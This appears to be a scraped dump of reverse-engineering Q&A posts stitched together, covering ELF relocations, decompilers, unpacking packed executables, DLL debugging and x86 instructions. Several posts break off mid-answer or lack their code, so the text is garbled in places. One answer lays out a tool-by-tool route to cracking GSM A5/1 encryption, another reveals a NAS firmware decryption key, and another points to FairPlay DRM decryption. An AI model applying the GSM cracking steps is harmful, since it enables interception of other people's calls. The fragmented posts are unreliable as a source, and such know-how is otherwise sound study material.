<p>Somehow, put all together, <code>.dynsym</code>, <code>.rela.dyn</code> and <code>.rela.plt</code> will allow to patch the initial memory (<em>i.e.</em> as mapped in the ELF binary), in order for the dynamic symbols to point to the right object (data or procedure).</p>

<p>Just to illustrate a bit more the process of relocation of dynamic symbols, I built examples in i386 and amd64 architectures.</p>

I believe to know that I can do it because IDA should support ARM decompilation... So my question is : How to decompile an objective-c library ? Or, Am I missing something ?</p>
","<p>There is <a href=""http://derevenets.com/"">SmartDec</a>, a native-code to C/C++ decompiler. It has two versions. Standalone and plugin to IDA. The latter supports all IDA's architectures, provides full GUI integration - is easy to work with -, makes use of <a href=""https://reverseengineering.stackexchange.com/questions/175/what-is-a-flirt-signature"">IDA Flirt signatures</a> and will make use of runtime information if you use it together with <a href=""https://github.com/deresz/funcap"">funcap</a>. There is also <a href=""http://decompiler.fit.vutbr.cz/decompilation/"">Retargetable Decompiler</a>, an online decompiler developed at Brno University of Technology that supports x86, ARM, ARM+Thumb and MIPS and can decompile to C or Python. It provides not only the decompilation but packer and compiler information, extraction of debug information, call and flow graphs, and signature-based removal of statically linked library code. Its only problem is its input size limitation of 10MB.</p>

<p>If those do not suffice your needs, you could also adapt or wait for the implementation of ARM support in either <a href=""https://github.com/EiNSTeiN-/ida-decompiler"">Einstein's IDA Decompiler</a>, <a href=""https://github.com/jcdutton/libbeauty"">libbeauty</a> - <a href=""https://github.com/jcdutton/reference"">reference material</a> -, or <a href=""http://sourceforge.net/projects/desquirr/"">desquirr</a> - as someone already <a href=""http://www.embedded.com/design/real-time-and-performance/4023282/3/Decompiling-the-ARM-architecture-code"">did</a> but released no code. The first two are the most promising. You could also wait for <a href=""http://hopperapp.com/"">Hopper</a> to improve it's ARM support. 
However, if you need to decompile it now, you'll have to purchase <a href=""https://www.hex-rays.com/products/ida/"">IDA</a> and the <a href=""https://www.hex-rays.com/products/decompiler/"">Hex-Rays Decompiler</a>, which is more than worth its cost - if you can afford it - and goes for about 3314 USD - including courier shipping - as of now for a named license.

</ol>
","<p>I'll answer this in two parts, #1 is relatively easy, #2 impossible to the level which I'm assuming you want.</p>

<h2>1. Extracting the hex code from the Uno:</h2>

<p>While the specifics will depend on the revision of the Uno that you have, you'll want to use avrdude (<a href=""http://savannah.nongnu.org/projects/avrdude"">available for linux, bundled with the OS X Arduino software</a>) and a command similar to the following that would extract the information from an ATmega168:</p>

<pre><code>avrdude -F -v -pm168 -cstk500v1 -P/dev/ttyUSB0 -b19200 -D -Uflash:r:program.bin:r
</code></pre>

<p>Look at the <a href=""http://www.nongnu.org/avrdude/user-manual/avrdude_4.html#Option-Descriptions"">avrdude documentation</a> to match the part parameter <code>-p</code> specific to your device (or post them and we can go from there).</p>

<p>Since it appears that you have the <a href=""http://arduino.cc/en/Main/arduinoBoardUno"">Uno Rev3</a>, that board has an ATmega328 (<code>-pm328</code>).  The programmer ""communicates using the original STK500 protocol"" thus the communication protocol flag <code>-c</code> should be <code>-cstk500v1</code> the command you would need (assuming the Uno is connected to /dev/ttyUSB0) follows:</p>

<h2>2. Converting Hex code to original source:</h2>

<p>Sorry, but that's not possible. While you can get some hex to c ""decompilers"" the gibberish returned, while functionally correct, will not be human readable (some commercial ones, like Hex-Rays, might give you some level of human-readability). </p>

<p>With that said, you're best bet would be a hex to assembly translator/converter - which will still only give you a better picture of what's happening, but will still be (by definition) very low level. All variable names, comments etc would be stripped and you're still going to be left with not knowing the original source program contents - just the compiled result. </p>

<p>Since you're dealing with an Atmel device you <em>could</em> try to use the avr specific gcc toolchain <code>avr-gcc</code>. Specifically, you'll need <code>avr-objdump</code> using the needed MCU type flag <code>-m atmega328</code> (avr5) architecture (<a href=""http://www.nongnu.org/avr-libc/user-manual/using_tools.html"">Full List of Available Architectures, MCU types</a>)</p>

<pre><code>avr-objdump -s -m atmega328 program.hex &gt; program.dump
</code></pre>

<p>It is also possible, depending on your configuration, that providing the architecture type itself (avr5) would be sufficient:</p>

<pre><code>avr-objdump -s -m avr5 program.hex &gt; program.dump

"What is the meaning of movabs in gas/x86 AT&T syntax?","13911","","<p>I just found a strange instruction by assembling (with <code>gas</code>) and disassembling (with <code>objdump</code>) on a <code>amd64</code> architecture.</p>

<p>The original <code>amd64</code> assembly code is:</p>

<pre><code>mov 0x89abcdef, %al
</code></pre>

<p>And, after <code>gas</code> compiled it (I am using the following command line: <code>gcc -m64 -march=i686 -c -o myobjectfile myassemblycode.s</code>), <code>objdump</code> gives the following code:</p>

<pre><code>a0 df ce ab 89 00 00    movabs 0x89abcdef, %al
</code></pre>

<p>My problem is that I cannot find any <code>movabs</code>, nor <code>movab</code> in the Intel assembly manual (not even a <code>mova</code> instruction).</p>

<p>So, I am dreaming ? What is the meaning of this instruction ? My guess is that it is a quirks from the GNU binutils, but I am not sure of it.</p>

<p>PS: I checked precisely the spelling of this instruction, so it is NOT a <code>movaps</code> instruction for sure.</p>
","<p>Here's the <a href=""http://sourceware.org/binutils/docs/as/i386_002dVariations.html"">official documentation for <code>gas</code></a>, quoting the relevant section:</p>

<blockquote>
  <p>In AT&amp;T syntax the size of memory operands is determined from the last
  character of the instruction mnemonic. Mnemonic suffixes of <code>b</code>, <code>w</code>,
  <code>l</code> and <code>q</code> specify byte (8-bit), word (16-bit), long (32-bit) and
  quadruple word (64-bit) memory references. Intel syntax accomplishes
  this by prefixing memory operands (not the instruction mnemonics) with
  <code>byte ptr</code>, <code>word ptr</code>, <code>dword ptr</code> and <code>qword ptr</code>. Thus, Intel <code>mov
  al, byte ptr foo</code> is <code>movb foo, %al</code> in AT&amp;T syntax. </p>
  
  <p>In 64-bit code, <code>movabs</code> can be used to encode the <code>mov</code> instruction
  with the 64-bit displacement or immediate operand.</p>

"Unpacking binaries in a generic way","13573","","<p>I find that more and more often binaries are being packed with exe protectors such as upx, aspack etc. I tried to follow a few tutorials on how to unpack them but the examples are often quite easy while my targets are not.</p>

<p>I am looking for good resources and any hints/tips on how to unpack targets.</p>
","<p>Unpacking a generic wrapping packer or cryptor usually involves the following steps:</p>

<h2>1. Trace the code, possibly evading or bypassing anti-debugging checks.</h2>

<p>This is not difficult with simple packers but might be tricky with the more advanced ones. They may employ timing checks (<code>rdtsc</code>), exception-based control transfer, using debug registers for calculations etc. Using a VM or an emulator here usually helps against most of them.</p>

<h2>2. Find the <em>original entry point</em> (OEP)</h2>

<p>There are many ways to do this. Sometimes the jump to OEP is obvious when it follows a chunk of looping code and there's nothing reasonable-looking after it. Or you may recognize the code at OEP if you're familiar with the entrypoints produced by different compilers. A couple other tricks:</p>

<ol>
<li><p>if the packer saves the original registers before unpacking, set a hardware breakpoint on their location in the stack - this way you'll break right when they're restored before jumping to OEP.</p></li>
<li><p>if during tracing you can identify memory where the unpacked code is being written, set a page execution breakpoint on that memory range - it will trigger after the jump. IDA allows you to set such a breakpoint, and I think OllyDbg too.</p></li>
<li><p>set breakpoints on common APIs used by startup code, e.g. <code>GetCommandLine</code> or <code>GetVersionEx</code>. This won't get you the exact OEP, but you can usually go back the callstack and find it more or less easily.</p></li>
</ol>

<h2>3. Dump the unpacked code</h2>

<p>If you're using IDA, you don't actually need to <em>dump</em> the file into a separate file - it's enough to take a memory snapshot that would copy the bytes from memory to the database so you can analyze them later. One thing to keep in mind here is that if the packer used dynamically allocated memory, you need to mark it as ""loader"" so it gets included in the snapshot. More <a href=""http://www.hexblog.com/?p=8"">here</a>.</p>

<h2>4. Restore imports</h2>

<p>I'm not very familiar how it's done in Olly or other debugger, but AFAIK you need to use a tool like ImpREC on your dump and a copy of the process in memory.</p>

<p>It's somewhat simpler (IMO) in IDA. You just need to find the import table and rename the pointers according to the functions they are currently pointing to (this should be done while debugger is active). You can use either <code>renimp.idc</code> script or UUNP ""manual reconstruct feature"" (see <a href=""http://www.hexblog.com/?p=403"">here</a>).</p>

<p>For finding import table there are two tricks I sometimes use:</p>

<ul>
<li><p>follow some calls in the startup code at OEP to find external APIs and this should lead you to the import table. Usually the start and the end of the table is obvious.</p></li>
<li><p>during unpacking, set a breakpoint on GetProcAddress and see where the results are written. This however won't work with packers that use manual import resultion using the export directory. Putting a read BP on kernel32's export table might help here.</p></li>
</ul>

<h2>5. Clean up</h2>

<p>This is optional but it may be useful to remove the remains of the packer code that would only distract you. In IDA, you should also apply a compiler FLIRT signature if you recognize the compiler used.</p>

<h2>6. Making an unpacked executable</h2>

<p>I don't do this step as I rarely need to run the unpacked file but in general you usually need to fix up the PE header so that offsets to the section's code in file match those in the dump.</p>

<hr>

<p>Now, there are many variations and tricks not covered by the above steps. For example, some packers don't fully resolve imports initially but put jumps to stubs that resolve import on first call and then patch it so it goes directly to the target next time. Then there is ""stolen code"" approach which makes it harder to find and recover OEP. Sometimes the packer runs a copy of itself and debugs it, so that you can't attach your own debugger to it (this can be solved by using emulator or a debugger that doesn't use debugging APIs like Intel PIN). Still, the outlined steps can cover quite a lot of what's out there.</p>

<p>I will conclude with the video that Elias made showing the process of unpacking the Lighty Compressor: <a href=""https://www.hex-rays.com/video/bochs_video_2.html"">https://www.hex-rays.com/video/bochs_video_2.html</a></p>

However i did not find any working solutions that would work with x64.</p>

<p>I am using only x64 windows platform so linux/mac solutions wont work (hopper is only 32 bit on windows).
Hex-rays is x86 as well.
There was ida-decompiler python scripts that i didn't get to work no matter what i did ( no output or pseudocode was generated).</p>

","<p>Here are tricks you can use when packaging your python app with a custom interpreter.</p>

<ol>
<li>Remap the opcodes for the interpreter</li>
<li>Encrypt the pyc files (the custom interpreter decrypts before importing)</li>
<li>Remove access to co_code in the interpreter (delete the reference to co_code in the code_memberlist array declaration in codeobject.c of the interpreter)</li>
<li>Obfuscate/protect the python interpreter</li>
<li>Do not bundle modules such as <code>dis</code> which would help in reverse engineering (basically reverse engineer an unobfuscated python program, note all modules/techniques you find useful and remove them from the custom interpreter)</li>
<li>Modify the interpreter so it can only import pyc files (can be done by removing the compile modules or filtering in the interpreter)</li>
<li>The <a href=""http://code.google.com/p/pyretic/"">pyREtic</a> folks give a few standard techniques for entering the custom interpreter. Testing these out on your app and trying to disable those access methods would make things much harder for a reverse engineer.</li>
<li>Remove functions from interpreter which the RE could call to help him/her out such as <code>PyRunString()</code>. Otherwise they can attach with a debugger and run arbitrary python code.</li>

"What does the assembly instruction 'REPNE SCAS BYTE PTR ES:[EDI]'?","12918","","<p>I disassembled a file with OllyDbg and it had the following instruction:</p>

<pre><code>REPNE SCAS BYTE PTR ES:[EDI]
</code></pre>

<p>What does that exactly mean ?</p>
","<p>The <code>SCAS</code> instruction is used to scan a string (<code>SCAS</code> = SCan A String). It compares the content of the accumulator (<code>AL</code>, <code>AX</code>, or <code>EAX</code>) against the current value pointed at by <code>ES:[EDI]</code>.</p>

<p>When used together with the <code>REPNE</code> prefix (<em>REPeat while Not Equal</em>), <code>SCAS</code> scans the string searching for the first string element which is equal to the value in the accumulator. </p>

<p>The Intel manual (Vol. 1, p.231) says:</p>

<blockquote>
  <p>The SCAS instruction subtracts the destination string element from the contents of the EAX, AX, or AL register (depending on operand length) and updates the status flags according to the results. The string element and register contents are not modified. The following “short forms” of the SCAS instruction specify the operand length: SCASB (scan byte string), SCASW (scan word string), and SCASD (scan doubleword string).</p>
</blockquote>

<p>So, basically, this instruction scan a string and look for the same character than the one stored in <code>EAX</code>. It won't touch any registers other than ECX (counter) and EDI (address) but the status flags according to the results.</p>

"Is reverse engineering and using parts of a closed source application legal?","11903","","<p>Is it legal to reverse engineer certain features of a closed source application and then integrate those features into a closed or open source application that may be either a commercial or non-commercial application ?</p>

<hr>

<p>Brownie points for an answer covering the situation in India.</p>
","<h2>In the United States</h2>

<p>The short answer is no for the purposes you've stated in your question, but keep reading to see exactly what is allowed. Also worth reading are the two links included herein.</p>

<p>In the U.S., Section 103(f) of the Digital Millennium Copyright Act (DMCA) (<a href=""http://www.law.cornell.edu/uscode/text/17/1201"" rel=""noreferrer"">17 USC § 1201 (f)</a> - Reverse Engineering) specifically states that it is legal to reverse engineer and circumvent the protection to achieve interoperability between computer programs (such as information transfer between applications). Interoperability is defined in paragraph 4 of Section 103(f).</p>

<p>It is also often lawful to reverse-engineer an artifact or process as long as it is obtained legitimately. If the software is patented, it doesn't necessarily need to be reverse-engineered, as patents require a public disclosure of invention. It should be mentioned that, just because a piece of software is patented, that does not mean the entire thing is patented; there may be parts that remain undisclosed.</p>

<p>Also of note is that in the U.S. most End-User License Agreements (EULAs) specifically prohibit reverse-engineering. Courts have found such contractual prohibitions to override the copyright law which expressly permits it (<a href=""https://law.resource.org/pub/us/case/reporter/F3/320/320.F3d.1317.01-1109.01-1108.html"" rel=""noreferrer""><em>Bowers v. Baystate Technologies</em>, 320 F.3d 1317 (Fed. Cir. 2003)</a>).</p>

<p>In other words, for your purposes, it sounds like it would be illegal to integrate features from a reverse-engineered program into another program for commercial or non-commercial use. If you were trying to enable interoperability (again, see Section 103(f), noted above), that would be different.</p>

<h2><strong>In India</strong></h2>

<p>From what I can find, the direct reverse engineering of software, in whole or in part, for use in your own software for commercial use, is protected under copyright. The protected reasons for reverse engineering are similar to those in the United States. According to the article <a href=""http://kvtrust.blogspot.com/2007/09/trade-secret-contract-and-reverse.html"" rel=""noreferrer"">Trade Secret, Contract and Reverse Engineering</a> (also note end note 5), the copyright act broadly protects actions (including reverse engineering) for the following purposes:</p>

<ul>
<li>Obtaining information essential for achieving interoperability of an independently created computer program with other programs if such information is not otherwise readily available.</li>
<li>Determining the ideas and principles underlying any element of the program for which the computer program was supplied.</li>
<li>Making copies or adaptations of a legally obtained copy of the computer program for non-commercial, personal use.</li>
</ul>

<p>Additionally, due to section 23 of the Indian Contract Act, which handles all contracts including License Agreements, a contract is declared void if it goes against public policy. Section 52 of the Copyright Act declares public policy concerning reverse engineering, which is that it is permitted in a limited way. A contract (or EULA), prohibiting reverse engineering in software to the extent permitted by the Copyright Act, may not stand in a court of law.</p>

<p>Section 52, subsections (aa) through (ad) of the Copyright Act explain these protected acts (see <a href=""http://copyright.gov.in/Documents/CopyrightRules1957.pdf"" rel=""noreferrer"">Indian Copyright Act 1957</a>, page 33, along with section 18 of <a href=""http://copyright.lawmatters.in/2012/06/impact-of-2012-amendments-to-copyright.html"" rel=""noreferrer"">these revisions from 2012</a>). Another source (though possibly a bit outdated) is <a href=""http://www.123helpme.com/view.asp?id=36962"" rel=""noreferrer"">Software Patent and Copyright Laws in India</a> (a paper) with its footnotes.</p>

"Firmware analysis and file system extraction?","11896","","<p>I'm trying to analyse the firmware image of a NAS device.</p>

<p>I used various tools to help the analysis (binwalk, deezee, signsrch, firmware-mod-kit which uses binwalk AFAIK), but all of them have been unsuccessful so far.</p>

<p>For example binwalk seems to generate false positive regarding gzip compressed data and Cisco IOS experimental microcode.</p>

</code></pre>

<p>When trying to decompress the data I got the following error using gunzip/gzip</p>

<pre><code>gzip: 4CD3B57.gz is a multi-part gzip file -- not supported
</code></pre>

<p>According to gzip FAQ (<a href=""http://www.gzip.org/#faq2"">http://www.gzip.org/#faq2</a>) this is due to a transfer not made in binary mode which has corrupted the gzip header.</p>

<p>It looks more like a false positive from binwalk to me mostly because the magic number used to identify gzip data can easily trigger false positive and the dates are wrong.</p>

<p>I also ran strings and hexdump command in order to have an idea of the contents of the file and try to identify known pattern but it didn't help much so far (I probably lack experience in that type of thing here).</p>

<p>The only non-gibberish/identifiable strings are located at the end of the firmware image.</p>

<p>It is the first time I'm going through that type of exercise and I'm not sure what I should do next. The image seems to be obfuscated somehow (that might be a wrong assumption).</p>

<p>Do you have suggestions/tricks that could help me make some progress?</p>
","<p>I've been dissecting the firmware for another type of embedded device for a while and thought I'd see if I could find anything out.  After a few hours I figured it out!  There is a hard way and an easy way that I found only after digging the hard way.  This is a long post, but I hope it will help others in similar ventures.</p>

<p>A little Googling and I found <a href=""http://wiki.qnap.com/wiki/Firmware_Recovery"">http://wiki.qnap.com/wiki/Firmware_Recovery</a> describing full firmware recovery methods and another page on the same wiki for ""Manually Updating Firmware"" with command line examples. A couple of things stuck out ...</p>

<ul>
<li><p>The NAS OS has a script for processing a firmware update image:</p>

<pre><code># /etc/init.d/update.sh /mnt/HDA_ROOT/update/TS-209_2.1.2_build1031.img
</code></pre></li>
<li><p>There is a checksum embedded in the binary and THEN there is this line in the output:</p>

<pre><code>""Using 120-bit encryption - (QNAPNASVERSION4)""
</code></pre></li>
</ul>

<p>I went down 2 paths: the hard way, and the very easy way ...</p>

<h3>The Hard Way (but with useful tips)</h3>

<p>I downloaded the TS-569 full system recovery image from the Firmware Recovery page which took almost 2 hours for 500MB.  Now I had to figure out what I was working with:  </p>

<pre><code># file F_TS-569_20120628-1.2.2.img

<p>Separate out the partitions (or you could write the image to a spare disk):</p>

<p>Remember the 2 things that stuck out from the Firmware Recovery page?  The update script and the encryption reference:</p>

<pre><code># more /mnt/tsinitrd/etc/init.d/update.sh
...
... line 223
    /sbin/PC1 d QNAPNASVERSION4 $path_name ${_tgz};
...
</code></pre>

<p>There's the reference to what appears to be the encryption key and perhaps the decrypter!
Since this NAS firmware image is x86 based, and I'm in an x86 VM, might as well try it:</p>

<pre><code># /mnt/tsinitrd/sbin/PC1
Usage: pc1 e|d ""key"" sourcefile &lt;targetfile&gt;
where: e - encrypt, d - decrypt &amp; ""key"" is the encryption key.
The length of the key will determine strength of encryption
If no targetfile, output file name is equal to sourfile name
ie: 5 characters is 40-bit encryption.
</code></pre>

<p>And finally:</p>

<pre><code># /mnt/tsinitrd/sbin/PC1 d QNAPNASVERSION4 TS-569_20130726-4.0.2.img TS-569_20130726-4.0.2.tgz

<p>All of that to get to an executable that decrypts the firmware image for us, a script that gives us the decryption key in plain text, and a way to package everything back together if we wanted to modify something.</p>

<p>... and now for something completely different</p>

<h2>The Very Easy Way</h2>

<p>Once I got to the end of the ""hard way"", I decided to google for the encryption key ""QNAPNASVERSION4"".  The first result was for the PC1 enc/dec algorithm in C that someone has already so kindly modified to handle the firmware format specifics for us: <a href=""http://www.r00ted.com/downloads/pc1.c"">http://www.r00ted.com/downloads/pc1.c</a></p>

"How to debug the DLL of an EXE using IDA Pro?","11710","","<p>I'm fairly new to the RE world, started right around a week and have gotten my hands dirty with some really good stuff on this website. Pardon my naive knowledge.</p>

<p>Currently, I'm trying to <strong>reverse a DLL file of a certain EXE</strong>. 
The EXE makes calls to functions of this DLL for looking up certain values which I plan to patch eventually.</p>

<p>How do I go about debugging the DLL while the application is running? </p>

<p><strong>I would like to be able to place a break point in my DLL and get a hit in IDA Pro while the call is made from the application.</strong></p>

<p>Right now, I patch the DLL by simply hoping for it to work, but I'm pretty sure that there exists a much productive method.</p>

<p>I'm using <strong>IDA Pro</strong> as my flavor of tool.
You could suggest me if some other disassembler can help me achieve the same.</p>

<p>Could someone be kind enough to guide me around this task?</p>
","<p>Very easy, if I got you right:</p>

<ol>
<li>Make an Ida project from the DLL, i.e. drag and drop the dll into the blank Ida page.</li>
<li>In Menu Debugger, Process Options, put the path to your exe into the textbox ""Application"", Into ""input file"" put the path to your DLL. Confirm with OK.</li>
<li>Start with menu Debugger, Start Process or F9.</li>
</ol>

I also suggest using <a href=""http://gqrx.dk/"">Gqrx</a> as it's built on Gnuradio and has a neat interface.</p>

<p>Architecture and theory wise, I'd recommend <a href=""https://docs.google.com/viewer?url=http://www2.informatik.hu-berlin.de/~goeller/isdn/GSMDmChannels.pdf"">About GSM Dm Channels</a>, which is a quite complete and detailed beginner paper that explains the GSM Architecture and how it works.

<p>Important observation : The GSM specifications are located in <a href=""http://www.3gpp.org/"">3GPP's website</a>. To find them, you need to determine the <a href=""http://www.3gpp.org/Specification-Numbering"">numbering</a> of the part you're looking for. Then, you browse into <a href=""ftp://ftp.3gpp.org/specs/"">their ftp server</a> and look for the date and release you fancy. (Releases prior to 2012-13 need to be solicited through their contact mail). Supposing you want the latest ""3G and Beyond / GSM"" Signalling Protocols specifications, you'll need to browse to their ""latest"" folder, descend to the release you're looking for (i.e. Release 12), and finally download the ""Series"" that contain the information you need - which in this case would be ""Series 24"". Therefore, the result of your endeavor would be : <a href=""ftp://ftp.3gpp.org/specs/latest/Rel-12/24_series/"">ftp://ftp.3gpp.org/specs/latest/Rel-12/24_series/</a> .
It's not a good user experience, especially because there are several empty directories, but with patience, you can find what you're looking for.</p>

<p><a href=""https://twitter.com/gat3way"">@gat3way</a> deserves a special mention for documenting his experiments in cracking GSM A5/1 in his blog (<a href=""http://www.gat3way.eu/index.php?mact=News,cntnt01,detail,0&amp;cntnt01articleid=199&amp;cntnt01returnid=57"">1</a>,<a href=""http://www.gat3way.eu/index.php?mact=News,cntnt01,detail,0&amp;cntnt01articleid=200&amp;cntnt01returnid=57"">2</a>,<a href=""http://www.gat3way.eu/index.php?mact=News,cntnt01,detail,0&amp;cntnt01articleid=201&amp;cntnt01returnid=57"">3</a>)  - includes a brief description of the A5/1 mechanism - and the fact that he has implemented support for cracking A5/1 using Pornin's attack in his password recovery tool, <a href=""http://www.gat3way.eu/hashkill/index.php"">hashkill</a> - <a href=""https://github.com/gat3way/hashkill/commit/d43fdd2ce042d75862930044fd0b4570bee56cf0"">git commit</a>.</p>

<p>An existing tool to crack A5/1 is Kraken, by srlabs (available through git://git.srlabs.de/kraken.git), which should be used after recording the data with Gnuradio/Gqrx and parsing it with <a href=""https://svn.berlin.ccc.de/projects/airprobe/"">Airprobe</a>. It needs GSM rainbow tables, available at the <a href=""https://opensource.srlabs.de/projects/a51-decrypt/files"">jump</a>. </p>

<p>Another tool that can be considered is <a href=""https://github.com/gat3way/hashkill/"">hashkill</a>, which takes the key to be cracked in a ""frame_number:keystream"" format - it's author published the code for converting a bin burst into the required input format <a href=""http://www.gat3way.eu/poc/encode.c"">here</a>. He also published a <a href=""http://www.gat3way.eu/poc/si5.phps"">php script</a> to locate suitable SI5/SI6 encrypted bursts for cracking - you'll need to change the hardcoded values for SI5 frames to fit your location -, which, together with Kraken's xortool, <a href=""http://www.mail-archive.com/a51@lists.reflextor.com/msg01023.html"">gsmframecoder</a> (that will be used to calculate Timing Advance changes) and <a href=""https://svn.berlin.ccc.de/projects/airprobe/"">Airprobe</a> should be sufficient to crack GSM.</p>

"AirPlay Mirroring decryption (FairPlay)","11450","","<p>I've been spending a good chunk of time looking at some 3rd party applications that were successful in ""reproducing"" (although I believe not necessarily by understanding the algorithm completely but simply extracting the core of the logic from the original binaries and replicating it into their own programs) the main logic for simulating an Apple TV server with full <strong>AirPlay mirroring</strong> support, to name a few:</p>

<ol>
<li>AirServer (OSX/Windows)</li>
<li>Reflector (OSX/Windows)</li>
<li>AirReceiver (Android)</li>
<li>X-Mirage (OSX/Windows)</li>
<li>AirPin PRO (Android)</li>
<li>EZCast Screen (Android)</li>
<li>Xiaomi Milian (Android/runs on Xiaomi Box)</li>
</ol>

<p>By looking at their decompiled code and some other references on the web, most of the protocol aspect is already known/relatively easy to figure out and I did it already, so no sweat there, the key part I'm having a tough time understanding how these guys were able to pull it off is related to the FairPlay decryption portion (i.e.: when receiving and responding to the <code>fp-setup</code> challenges as well as decrypting the AES key sent in the last step of the challenge).</p>

<p>They all seem to have extracted the <a href=""https://reverseengineering.stackexchange.com/questions/6544/identify-decompiled-decryption-algorithm"">white-boxed/obfuscated</a> functions out of Apple's original <code>airtunesd</code>/<code>fairplayd</code> daemon code and embedded it into their source, delegating the calls to seed/encrypt/decrypt to it.</p>

<p>I noticed in some iOS devices this daemon also exist (most likely used to encrypt the feed when mirroring the screen via AirPlay to a compatible server) but was wondering how different this really is from the one shipped with the Apple TV and if my assumptions are actually correct (is that were most of these guys are taking this code from?).</p>

<p>Was hoping either someone with previous experience or a little more knowledge on the topic could shed some light/pointers so I could find a way to at least do the same these guys were able to accomplish (which is not really deobfuscating the code but just extracting it to embed in their own programs).</p>

<p><strong>PS:</strong> For clarity, aside from confirmation I was looking for some pointers as to how one would be able to extract <strong>compilable</strong> code from a said binary, given my attempts at disassembling and decompiling via IDA Pro haven't provided me with much that I can reuse to compile new code that reproduces that piece of the puzzle.</p>
","<p>I have spent some time to look into Apple's airplay mirroring support, which is encrypted by fairplay protocol. After investigating serveral existing commercial applications I have finally managed to get a way of decrypting fairplay protected streams.
I have extended the shairplay code to demostrate this ability. Please look at <a href=""https://github.com/foxsen/shairplay"" rel=""nofollow"">https://github.com/foxsen/shairplay</a>, parts of the README.md:</p>

<p>Update by foxsen, 2015/4/20: Experimental support for fairplay protocol and airplay:</p>

<ul>
<li>fairplay encrpted audio is supported (et == 3)</li>
<li>AAC-ELD audio is supported(untested yet)</li>
<li>airplay service framework is added, up to the point that the mirroring connection starts streaming. But the UI and callbacks to be done.</li>
<li>fairplay support is performed via interactions with a server</li>
</ul>

<p>Because I have not enough time and interest to do all the other necessary coding to make a full open source solution that support mirroring, I hope people can help to continue the project or port my code into other projects like kodi. I am willing to help with related issues.</p>

<p>The dirty works are hidden in my server app. During a session with fairplay, we need to interact with the server for three times to get the job done. You can read the code above to learn how. When I get more time, I prepare the write something about this part of work. Basically it involves some reverse engineering and a lot of tricks to rebuild a relocatable object from part of a binary.</p>

<p>Public access to that app is open and free for personal visits now. If anybody want to use it in commercial environment, you can contact me.</p>

<p>Happy hacking.</p>

"What purpose of mov %esp,%ebp?","11397","","<p>When execution enters a new function by performing call  I do often see this code template (asm list generated by Gnu Debugger when in debugging mode):</p>

<pre><code>0x00401170  push   %ebp
0x00401171  mov    %esp,%ebp
0x00401173  pop    %ebp
</code></pre>

<p>So what's the purpose of moving esp to ebp?</p>
","<p>Moving <code>esp</code> into <code>ebp</code> is done as a debugging aid and in some cases for exception handling.  <code>ebp</code> is often called the frame pointer.  With this in mind, think of what happens if you call several functions.  <code>ebp</code> points to a block of memory where you pushed the old <code>ebp</code>, which itself points to another saved <code>ebp</code>, etc.  Thus, you have a linked list of stack frames.  From these, you can look at the return addresses (which are always 4 bytes above the frame pointer in the stack frame) to find out what line of code called a stack frame in question.  The instruction pointer can tell you the location of current execution.  This allows you to generate a <a href=""https://en.wikipedia.org/wiki/Stack_trace"">stacktrace</a> which is useful for debugging by showing the flow of execution throughout a program.</p>

<p>As a practical example consider the following code:</p>

<pre><code>void foo();
void bar();
void baz();
void quux();

void foo() {
    bar();
}

void bar() {
    baz();
    quux();
}

void baz() {
    //do nothing
}

void quux() {
    *(int*)(0) = 1; //SEGFAULT!
}

int main() {
    foo();
    return 0;
}
</code></pre>

<p>This generates the following assembly (with Debian gcc 4.7.2-4 <code>gcc -m32 -g test.c</code>, snipped):</p>

</code></pre>

<p>Note that <code>leave</code> is the same as:</p>

<pre><code>mov %ebp, %esp
pop %ebp
</code></pre>

<p>With this in mind, and the standard-ish C calling convention on x86, we know that the stack at the segfault is going to look like:</p>

<ol>
<li><em>top of main's stack frame</em></li>
<li><em>stack space for main - in this case, enough to align on 16 bytes</em></li>
<li><code>0x0804841b</code> <em>return address for</em> <code>call foo</code></li>
<li><em>pointer to <code>1.</code></em></li>
<li><em>stack space for foo</em></li>
<li><code>0x080483e7</code> <em>return address for</em> <code>call bar</code></li>
<li><em>pointer to <code>4.</code></em></li>
<li><em>stack space for bar</em></li>
<li><code>0x080483f9</code> <em>return address for</em> <code>call quux</code></li>
<li><em>pointer to <code>7.</code></em></li>
<li><em>stack space for quux</em></li>
</ol>

<p>The instruction pointer will be <code>0x08048408</code>. <code>ebp</code> will point to <em><code>10.</code></em>.</p>

<p>At this point, the processor generates an exception, which the operating system processes.  It then sends <code>SIGSEGV</code> to the process, which obligingly terminates and dumps core.  You then bring up the core dump in gdb with <code>gdb -c core</code>, and you type in <code>file a.out</code> and <code>bt</code>, and it gives you in response:</p>

<pre><code>#0  0x08048408 in quux () at test.c:20
#1  0x080483f9 in bar () at test.c:12
#2  0x080483e7 in foo () at test.c:7
#3  0x0804841b in main () at test.c:24
</code></pre>

<p><code>#0</code> is generated from the instruction pointer.  Then, it goes to <code>ebp</code> (10), looks at the previous item on the stack (9), and generates <code>#1</code>.  It follows <code>ebp</code> (i.e. <code>mov %ebp, (%ebp)</code>) to (7), and looks 4 bytes above that (6) to generate <code>#2</code>.  It finally follows (7) to (4) and looks at (3) to generate <code>#3</code>.</p>

<p><strong>Note:</strong>  This is but one way of doing such stack tracing.  GDB is very, very smart, and can perform the stack trace even when you use <code>-fomit-frame-pointer</code>.  However, in a very basic implementation this is probably the simplest way to generate a stack trace.</p>

<p>So, the <em>export table</em> seems to be what we are looking for (not sure about it). But it is drown among a lot of other information (the option <code>-p</code> display really a LOT of lines).</p>

<p>So, first, is the export table what I am looking for to know what are the functions and variables that exported by the DLL ?</p>

<p>Second, why did <code>objdump</code> present differently the exported symbols in the case of ELF and PE ? (I guess there is some technical differences between exported symbols in ELF and PE and that confusing both would be extremely misleading, but I would like to know in what they differ).</p>
","<p>The surprising part for me is <code>objdump</code> can recognize <em>anything</em> in a PE file. According to <a href=""http://en.wikipedia.org/wiki/Portable_Executable"" rel=""noreferrer"">Wikipedia</a>,</p>

<blockquote>
  <p>.. PE is a modified version of the Unix COFF file format. PE/COFF is an alternative term in Windows development.</p>
</blockquote>

<p>so apparently there is just enough overlap in the headers to make it work (at least partially). The basic design of one is clearly based on the other, but after that they evolved separately. Finding the exact differences at this point in time might well be a pure academical exercise.</p>

<p>Yes: in a DLL, the export directory <em>is</em> what you are looking for. Here is a screen grab from <a href=""http://www.dependencywalker.com"" rel=""noreferrer"">Dependency Walker</a> inspecting <code>comctl32.dll</code> (using VirtualBox 'cause I'm on a Mac):</p>

<p><img src=""https://i.stack.imgur.com/5CPMn.png"" alt=""Dependency Walker showing Exports""></p>

<p>The field ""E^"" lists the exported function names and other interesting details.</p>

